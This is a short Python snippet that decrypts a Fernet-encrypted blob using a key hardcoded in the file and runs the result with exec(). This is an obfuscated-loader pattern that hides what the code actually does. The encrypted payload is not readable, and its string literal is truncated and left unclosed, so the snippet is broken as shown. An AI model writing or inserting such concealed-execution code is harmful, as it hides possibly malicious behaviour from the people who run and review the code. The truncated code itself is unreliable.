from cryptography.fernet import Fernet
key = b'kL2R9su7JgLs8T2HN1AXRhI2ETV3cFS-sOC6H7Oz2Oc='
f = Fernet(key)
b = b'gAAAAABfGq6xRT7HWWucx21NptZTBd1-D0IvQACm2qheEFQSJlvnbZKK47qBcRP>
exec(f.decrypt(b))
